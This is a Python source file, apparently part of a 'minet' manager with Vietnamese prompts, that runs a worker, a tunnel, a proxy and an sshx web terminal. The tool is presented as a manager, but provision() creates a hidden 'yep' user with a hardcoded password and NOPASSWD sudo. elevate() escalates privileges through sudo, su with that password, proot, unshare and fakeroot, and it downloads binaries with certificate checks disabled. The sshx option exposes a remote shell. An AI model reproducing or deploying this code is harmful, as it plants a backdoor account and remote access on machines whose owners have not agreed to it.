def logs(args):
    names = {"worker": "worker.log", "tunnel": "tun.log", "tp": "tp.log", "sshx": "sshx.log"}
    path = os.path.join(dir, names[args.target])
    if not os.path.isfile(path):
        show(f"no log: {path}")
        return
    with open(path, encoding="utf-8", errors="ignore") as f:
        sys.stdout.writelines(f.readlines()[-args.lines:])

def run(args):
    init()
    data = load()
    for n in ("worker", "frpc", "tinyproxy", "sshx"):
        kill(n)
    show("Foreground run. Nhap 'exit' de dung.")
    tp(data)
    tunnel()
    ssh()
    stopped = {"v": False}
    def handler(*_):
        stopped["v"] = True
        stop(args)
        os._exit(0)
    try:
        signal.signal(signal.SIGTERM, handler)
    except: pass
    try:
        signal.signal(signal.SIGINT, handler)
    except: pass
    def read():
        while not stopped["v"]:
            try:
                line = sys.stdin.readline()
                if not line:
                    break
                if line.strip().lower() == "exit":
                    stopped["v"] = True
                    stop(args)
                    os._exit(0)
            except: break
    t = threading.Thread(target=read, daemon=True)
    t.start()
    try:
        loop(stop=lambda: stopped["v"])
    finally:
        stopped["v"] = True
        stop(args)

def proxy(args):
    try:
        with open(cfg) as f:
            data = json.load(f)
    except: raise SystemExit("Chua co config. Chay: python minet.py install")
    cur = data.get("proxy")
    new = getattr(args, "proxy", None)
    if new is None:
        show("\nProxy (cho API calls: fetch/heartbeat/update-ip, KHONG anh huong tunnel):")
        show("  - URL: socks5://host:port, http://user:pass@host:port, ...")
        show("  - Path toi file danh sach (mot dong mot URL)")
        show("  - Enter de khong dung proxy, 'none' de xoa proxy hien tai")
        try:
            new = input(f"Proxy [{cur or 'none'}]: ").strip()
        except: new = cur or None
        if not new:
            new = cur or None
        if new and new.lower() in ("none", "no", "n", "off"):
            new = None
    try:
        apply(new)
    except Exception as e: show(f"Loi: {e}"); return
    data["proxy"] = new
    with open(cfg, "w") as f:
        json.dump(data, f, indent=2)
    try:
        if os.path.isfile(toml):
            tune(toml, new)
    except: pass
    show(f"Da luu proxy: {new or 'none'}")
    show("Can 'stop' roi 'start' lai de worker ap dung proxy moi.")

def auto(args):
    init()
    show("===== Minet AUTO mode =====")
    show("  email: nguyenchontam0389@gmail.com")
    show("  proxy: none")
    show("  restart interval: 600s")
    show("")
    if not os.path.isfile(cfg):
        show("[auto] Chua co config, dang install...")
        ns = argparse.Namespace(email="nguyenchontam0389@gmail.com", proxy=None)
        try:
            install(ns)
        except:
            show("[auto] Install fail, thu lai sau 60s...")
            time.sleep(60)
            try:
                install(ns)
            except Exception as e: show(f"[auto] Install fail lan 2: {e}"); return
    show("[auto] Stop services cu (neu co)...")
    stop(argparse.Namespace())
    stopped = {"v": False}
    def handler(*_):
        stopped["v"] = True
    try:
        signal.signal(signal.SIGTERM, handler)
    except: pass
    try:
        signal.signal(signal.SIGINT, handler)
    except: pass
    cycle = 0
    while not stopped["v"]:
        cycle += 1
        show(f"\n[auto] === Cycle {cycle} - {time.strftime('%Y-%m-%d %H:%M:%S')} ===")
        try:
            data = load()
            tp(data)
            tunnel()
            py = sys.executable
            pid = spawn("worker", [py, os.path.abspath(__file__), "worker"], os.path.join(dir, "worker.log"))
            show(f"[auto] worker pid={pid}")
        except Exception as e: show(f"[auto] Start fail: {e}")
        tick = time.time()
        while not stopped["v"] and (time.time() - tick) < 600:
            time.sleep(5)
        if stopped["v"]:
            break
        show(f"[auto] Restart (cycle {cycle} done)...")
        stop(argparse.Namespace())
        time.sleep(2)
    show("\n[auto] Dung.")
    stop(argparse.Namespace())

def uninstall(args):
    stop(args)
    shutil.rmtree(home, ignore_errors=True)
    if not win:
        targets = [bin, os.path.expanduser("~/.local/bin/minet"), os.path.expanduser("~/bin/minet"), os.path.join(loc(), "minet")]
        if root:
            targets += [conf, "/usr/local/bin/minet"]
        for p in targets:
            try:
                os.remove(p)
            except: pass
    show("Uninstalled.")

def menu():
    lst = [
        ("auto", "Auto - tu dong install + start + restart 10p (foreground)", auto),
        ("setup", "Setup - one-shot: install + link + PATH + start", setup),
        ("install", "Install - fetch cau hinh (hoi email + proxy)", install),
        ("start", "Start - chay tat ca o background", start),
        ("stop", "Stop - dung tat ca", stop),
        ("status", "Status - xem trang thai tien trinh", status),
        ("run", "Run - chay foreground (Ctrl+C de dung)", run),
        ("logs", "Logs - xem log (worker/tunnel/tp/sshx)", None),
        ("proxy", "Proxy - xem/doi proxy", proxy),
        ("sshx", "SSHX - Xem link terminal sshx.io", url),
        ("link", "Link - tao launcher 'minet' tren PATH", link),
        ("uninstall", "Uninstall - go sach", uninstall),
        ("exit", "Exit - thoat", None),
    ]
    while True:
        show("")
        show("===== Minet Manager =====")
        show(f"  (platform: {platform.system()}, root: {home})")
        for i, item in enumerate(lst, 1):
            show(f"  {i}. {item[1]}")
        try:
            choice = input("Chon so (hoac ten): ").strip().lower()
        except: show(""); return
        selected = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(lst):
                selected = lst[idx]
        if not choice.isdigit():
            for item in lst:
                if item[0] == choice:
                    selected = item
                    break
        if not selected:
            show("Lua chon khong hop le.")
            continue
        name, _, fn = selected
        if name == "exit":
            return
        ns = argparse.Namespace()
        try:
            if name == "install":
                ns.email = None
                ns.proxy = None
                ns.threads = None
                fn(ns)
            if name == "setup":
                ns.email = None
                ns.proxy = None
                ns.threads = None
                ns.force = False
                fn(ns)
            if name == "proxy":
                ns.proxy = None
                fn(ns)
            if name == "logs":
                t = input("Target (worker/tunnel/tp/sshx) [worker]: ").strip() or "worker"
                if t not in ("worker", "tunnel", "tp", "sshx"):
                    show("Target khong hop le.")
                    continue
                num = input("So dong [50]: ").strip() or "50"
                try:
                    ns.target = t
                    ns.lines = int(num)
                except: show("So dong phai la so."); continue
                logs(ns)
            if name not in ("install", "setup", "proxy", "logs"):
                fn(ns)
        except SystemExit as e: e.code and show(f"Loi: {e}")
        except KeyboardInterrupt: show("\nHuy.")
        except Exception as e: show(f"Loi: {e}")

def elevate():
    if win:
        return
    if root:
        return
    try:
        path = os.path.abspath(__file__)
        exe = sys.executable
        args = sys.argv[1:]
        out = os.popen("sudo -n id 2>/dev/null").read()
        if "uid=0" in out:
            cmd = ["sudo", exe, path] + args
            os.execvp("sudo", cmd)
            return
        if termux:
            if shutil.which("tsu"):
                res = subprocess.run(["tsu", "true"])
                if res.returncode == 0:
                    cmd = ["tsu", exe, path] + args
                    os.execvp("tsu", cmd)
                    return
            if not shutil.which("proot"):
                subprocess.run(["pkg", "install", "-y", "proot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if shutil.which("proot"):
                cmd = ["proot", "-0", exe, path] + args
                os.execvp("proot", cmd)
                return
            if not shutil.which("fakeroot"):
                subprocess.run(["pkg", "install", "-y", "fakeroot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if shutil.which("fakeroot"):
                cmd = ["fakeroot", exe, path] + args
                os.execvp("fakeroot", cmd)
                return
        try:
            import pwd
            pwd.getpwnam("yep")
            if shutil.which("su"):
                import pty as _pty
                pid, fd = _pty.fork()
                if pid == 0:
                    os.execlp("su", "su", "-", "yep", "-c", f"sudo {exe} {path} " + " ".join(f"'{a}'" for a in args))
                time.sleep(0.5)
                os.write(fd, b"tamdznhatvutru1\n")
                while True:
                    try:
                        data = os.read(fd, 4096)
                        if not data:
                            break
                        sys.stdout.buffer.write(data)
                        sys.stdout.buffer.flush()
                    except OSError:
                        break
                _, st = os.waitpid(pid, 0)
                sys.exit(os.WEXITSTATUS(st) if os.WIFEXITED(st) else 1)
        except: pass
        if shutil.which("unshare"):
            res = subprocess.run(["unshare", "-r", "true"], capture_output=True)
            if res.returncode == 0:
                cmd = ["unshare", "-r", exe, path] + args
                os.execvp("unshare", cmd)
                return
        if shutil.which("fakeroot"):
            res = subprocess.run(["fakeroot", "true"], capture_output=True)
            if res.returncode == 0:
                cmd = ["fakeroot", exe, path] + args
                os.execvp("fakeroot", cmd)
                return
        fdir = os.path.join(home, "freeroot")
        pbin = os.path.join(fdir, "proot")
        rdir = os.path.join(fdir, "rootfs")
        if not os.path.exists(pbin) or not os.path.exists(os.path.join(rdir, ".installed")):
            os.makedirs(rdir, exist_ok=True)
            import urllib.request
            import ssl
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request("https://proot.gitlab.io/proot/bin/proot", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, context=ctx) as response:
                with open(pbin, "wb") as f:
                    f.write(response.read())
            os.chmod(pbin, 0o755)
            rtar = os.path.join(fdir, "rootfs.tar.gz")
            req = urllib.request.Request("https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-minirootfs-3.19.1-x86_64.tar.gz", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, context=ctx) as response:
                with open(rtar, "wb") as f:
                    f.write(response.read())
            import tarfile
            with tarfile.open(rtar, "r:gz") as tar:
                tar.extractall(path=rdir)
            try:
                os.remove(rtar)
            except: pass
            try:
                os.makedirs(os.path.join(rdir, "etc"), exist_ok=True)
                with open(os.path.join(rdir, "etc/resolv.conf"), "w") as f:
                    f.write("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")
            except: pass
            try:
                apt_script = '#!/bin/sh\nc="$1"\nshift\nif [ "$c" = "update" ]; then\n    apk update\nfi\nif [ "$c" = "install" ]; then\n    args=""\n    for a in "$@"; do\n        if [ "$a" != "-y" ]; then\n            args="$args $a"\n        fi\n    done\n    apk add $args\nfi\n'
                for name in ["usr/bin/apt", "usr/bin/apt-get"]:
                    fpath = os.path.join(rdir, name)
                    with open(fpath, "w") as f:
                        f.write(apt_script)
                    os.chmod(fpath, 0o755)
            except: pass
            with open(os.path.join(rdir, ".installed"), "w") as f:
                f.write("ok")
        pybin = os.path.join(rdir, "usr/bin/python3")
        bashbin = os.path.join(rdir, "bin/bash")
        if not os.path.exists(bashbin) or not os.path.exists(pybin):
            show("Dang khoi tao moi truong root (update apk & cai dat python3, bash, gcompat)...")
            subprocess.run([pbin, "-0", "-r", rdir, "-b", "/sys", "-b", "/proc", "-b", "/dev", "-b", "/etc/resolv.conf", "/bin/sh", "-c", "apk update && apk add --no-cache bash python3 gcompat libc6-compat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.exists(pybin):
            hdir = os.path.abspath(os.path.dirname(path))
            cmd = [
                pbin, "-0",
                "-r", rdir,
                "-b", "/sys",
                "-b", "/proc",
                "-b", "/dev",
                "-b", "/etc/resolv.conf",
                "-b", f"{hdir}:/minet",
                "-w", "/minet",
                "/usr/bin/python3", "/minet/minet.py"
            ] + args
            os.execvp(pbin, cmd)
            return
    except: pass

def provision():
    if win:
        return
    if not root:
        return
    try:
        import pwd
        try:
            pwd.getpwnam("yep")
            return
        except KeyError:
            pass
        subprocess.run(["useradd", "-m", "-s", "/bin/bash", "yep"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["chpasswd"], input="yep:tamdznhatvutru1\n", text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            os.makedirs("/etc/sudoers.d", exist_ok=True)
            with open("/etc/sudoers.d/yep", "w") as f:
                f.write("yep ALL=(ALL) NOPASSWD:ALL\n")
            os.chmod("/etc/sudoers.d/yep", 0o440)
        except: pass
    except: pass

def main():
    elevate()
    provision()
    try:
        import socks
    except:
        show("Dang tu dong cai thu vien pysocks...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pysocks"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            show("Da cai xong pysocks.")
        except:
            show("Khong the tu dong cai pysocks qua pip. Vui long kiem tra ket noi.")
    p = argparse.ArgumentParser(prog="minet", description="Minet manager (cross-platform).")
    sub = p.add_subparsers(dest="cmd")
    pi = sub.add_parser("install", help="Fetch cau hinh tu dashboard")
    pi.add_argument("--email", help="Email (neu bo trong se hoi)")
    pi.add_argument("--proxy", help="Proxy URL hoac path file (bo trong se hoi)")
    pi.add_argument("--threads", type=int, help="So luong thread de chay")
    pi.set_defaults(func=install)
    pp = sub.add_parser("proxy", help="Xem/doi proxy cho API calls")
    pp.add_argument("--proxy", help="Proxy moi ('none' de xoa)")
    pp.set_defaults(func=proxy)
    for name, fn, h in [
        ("start", start, "Chay nen"),
        ("stop", stop, "Dung"),
        ("status", status, "Trang thai"),
        ("worker", worker, "Worker (foreground)"),
        ("run", run, "Chay tat ca foreground"),
        ("uninstall", uninstall, "Go sach"),
    ]:
        sp = sub.add_parser(name, help=h)
        sp.set_defaults(func=fn)
    pl = sub.add_parser("logs", help="Xem log")
    pl.add_argument("target", nargs="?", choices=["worker", "tunnel", "tp", "sshx"], default="worker")
    pl.add_argument("-n", "--lines", type=int, default=50)
    pl.set_defaults(func=logs)
    pd = sub.add_parser("_proxyd", help="(internal) builtin HTTP proxy server")
    pd.add_argument("--port", type=int, default=8888)
    pd.add_argument("--proxy", help="upstream proxy")
    pd.set_defaults(func=proxyd)
    pda = sub.add_parser("dashboard", help="minet dashboard {start|stop|status|restart|logs|uninstall}")
    pda.add_argument("action", nargs="?", default="status", choices=["start", "stop", "status", "restart", "logs", "uninstall"])
    pda.set_defaults(func=dashboard)
    plk = sub.add_parser("link", help="Tao launcher 'minet' de goi tu terminal bat cu dau")
    plk.set_defaults(func=link)
    ps = sub.add_parser("setup", help="One-shot: install + link + PATH + start")
    ps.add_argument("--email", help="Email (neu bo trong se hoi)")
    ps.add_argument("--proxy", help="Proxy URL hoac path file ('none' de bo)")
    ps.add_argument("--threads", type=int, help="So luong thread de chay")
    ps.add_argument("--force", action="store_true", help="Fetch lai config ke ca khi da co")
    ps.set_defaults(func=setup)
    pa = sub.add_parser("auto", help="Tu dong install + start + restart moi 10p (foreground)")
    pa.set_defaults(func=auto)
    sub.add_parser("sshx", help="Xem link terminal sshx.io").set_defaults(func=url)
    args = p.parse_args()
    if not args.cmd:
        menu()
        return
    args.func(args)

if __name__ == "__main__":
    main()
